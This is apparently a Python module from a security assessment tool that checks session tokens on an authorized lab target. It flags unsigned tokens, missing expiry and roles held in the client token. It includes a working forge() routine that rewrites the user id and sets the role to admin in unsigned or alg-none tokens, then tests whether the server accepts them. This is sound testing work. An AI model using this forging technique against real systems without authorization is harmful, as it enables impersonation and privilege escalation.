"""Authentication / session analyzer.

Inspects how login and sessions work, then produces observations about
session weaknesses. Structural facts (unsigned token, no expiry) are
deterministically readable from the token itself and are marked `verified`.
Forgeability is only marked `verified` after an actual reproduction succeeds
against the authorized target; otherwise it stays `suspected`.

All evidence is redacted: tokens are shown by prefix only, and user secrets
(password_hash, api_key) are never copied into observations.
"""
import base64
import json
from dataclasses import dataclass, field

from app.config import LAB, AssessmentConfig
from app.engine.http_client import ScopedClient

ID_CLAIM_KEYS = ("uid", "user_id", "id", "sub")
ROLE_CLAIM_KEYS = ("role", "roles", "scope")


@dataclass
class SessionObservation:
    id: str
    title: str
    status: str            # suspected | verified
    severity_hint: str     # info | low | medium | high | critical
    rationale: str
    evidence: dict = field(default_factory=dict)


@dataclass
class AuthAnalysisReport:
    token_type: str
    observations: list[SessionObservation] = field(default_factory=list)


def _b64pad(s: str) -> str:
    return s + "=" * (-len(s) % 4)


def classify_token(token: str) -> dict:
    parts = token.split(".")
    if len(parts) == 3:
        try:
            header = json.loads(base64.urlsafe_b64decode(_b64pad(parts[0])).decode())
            payload = json.loads(base64.urlsafe_b64decode(_b64pad(parts[1])).decode())
            alg = header.get("alg")
            return {"type": "jwt", "alg": alg, "claims": payload,
                    "signed": bool(parts[2]) and str(alg).lower() != "none"}
        except Exception:
            pass
    try:
        payload = json.loads(base64.urlsafe_b64decode(_b64pad(token)).decode())
        return {"type": "base64-json", "alg": None, "claims": payload, "signed": False}
    except Exception:
        return {"type": "opaque", "alg": None, "claims": None, "signed": None}


def forge(info: dict, target_uid, target_role: str = "admin") -> str | None:
    claims = dict(info.get("claims") or {})
    id_key = next((k for k in ID_CLAIM_KEYS if k in claims), "uid")
    claims[id_key] = target_uid
    for k in ROLE_CLAIM_KEYS:
        if k in claims:
            claims[k] = target_role
    if info["type"] == "base64-json":
        return base64.urlsafe_b64encode(json.dumps(claims).encode()).decode()
    if info["type"] == "jwt" and str(info.get("alg")).lower() == "none":
        h = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip("=")
        p = base64.urlsafe_b64encode(json.dumps(claims).encode()).decode().rstrip("=")
        return f"{h}.{p}."
    return None  # opaque / properly-signed -> not trivially forgeable


def analyze(config: AssessmentConfig = LAB) -> AuthAnalysisReport:
    obs: list[SessionObservation] = []
    # use the lowest-privilege role as the starting identity
    cred = min(config.credentials, key=lambda c: 0 if c.role == "viewer" else 1)

    with ScopedClient(config) as client:
        login = client.post(config.login_path,
                             json={"username": cred.username, "password": cred.password})
        token = login.json().get("token")
        info = classify_token(token)
        token_prefix = token[:6] + "..."

        # own identity (pull only id + username; ignore any leaked secrets)
        me = client.get("/api/users/me",
                        headers={"Authorization": f"Bearer {token}"}).json()
        own_uid, own_name = me.get("id"), me.get("username")

        # 1. unsigned / transparent token (structural -> verified)
        if info["signed"] is False:
            obs.append(SessionObservation(
                id="SESS-UNSIGNED-TOKEN",
                title="Session token is unsigned and transparent",
                status="verified", severity_hint="high",
                rationale="Token decodes to readable claims with no integrity "
                          "protection, so its contents can be altered at will.",
                evidence={"token_prefix": token_prefix, "type": info["type"],
                          "claim_keys": list((info.get("claims") or {}).keys())},
            ))

        # 2. no expiry (structural -> verified)
        claims = info.get("claims") or {}
        if claims and not any(k in claims for k in ("exp", "expires", "exp_at")):
            obs.append(SessionObservation(
                id="SESS-NO-EXPIRY",
                title="Session token has no expiry",
                status="verified", severity_hint="medium",
                rationale="No expiry claim present; a leaked token is valid indefinitely.",
                evidence={"token_prefix": token_prefix,
                          "claim_keys": list(claims.keys())},
            ))

        # 3. client-supplied role carried in token
        role_key = next((k for k in ROLE_CLAIM_KEYS if k in claims), None)
        if role_key:
            obs.append(SessionObservation(
                id="SESS-CLIENT-SUPPLIED-ROLE",
                title="Authorization role is carried inside the client token",
                status="suspected", severity_hint="high",
                rationale="Role lives in the token the client holds; if unsigned, "
                          "the client can set its own role.",
                evidence={"role_claim": role_key, "observed_value": claims.get(role_key)},
            ))

        # 4. forgeable identity (reproduction -> verified only if it works)
        forged_uid = 1 if own_uid != 1 else 2
        forged = forge(info, forged_uid)
        if forged:
            resp = client.get("/api/users/me",
                              headers={"Authorization": f"Bearer {forged}"})
            impersonated = resp.json() if resp.status_code == 200 else {}
            reproduced = (resp.status_code == 200
                          and impersonated.get("id") == forged_uid
                          and impersonated.get("username") != own_name)
            obs.append(SessionObservation(
                id="SESS-FORGEABLE-IDENTITY",
                title="Forged token impersonates another user without credentials",
                status="verified" if reproduced else "suspected",
                severity_hint="critical",
                rationale="A token minted locally for a different user id was "
                          "accepted, proving the server trusts token contents.",
                evidence={"authenticated_as": own_name, "forged_uid": forged_uid,
                          "server_accepted": resp.status_code == 200,
                          "returned_username": impersonated.get("username")},
            ))

        # 5. control: token accepted via URL query param? (should be NO -> no FP)
        url_test = client.get(f"/api/users/me?authorization=Bearer {token}")
        if url_test.status_code == 200:
            obs.append(SessionObservation(
                id="SESS-TOKEN-IN-URL",
                title="Session token accepted in URL query string",
                status="verified", severity_hint="medium",
                rationale="Tokens in URLs leak via logs, history and referrers.",
                evidence={"status": url_test.status_code},
            ))

    return AuthAnalysisReport(token_type=info["type"], observations=obs)


if __name__ == "__main__":
    report = analyze()
    print(f"Token type: {report.token_type}")
    print(f"{len(report.observations)} session observation(s):\n")
    for o in report.observations:
        print(f"  [{o.status.upper():9}] {o.severity_hint:8} {o.id}")
        print(f"             {o.title}")
        print(f"             evidence: {o.evidence}\n")
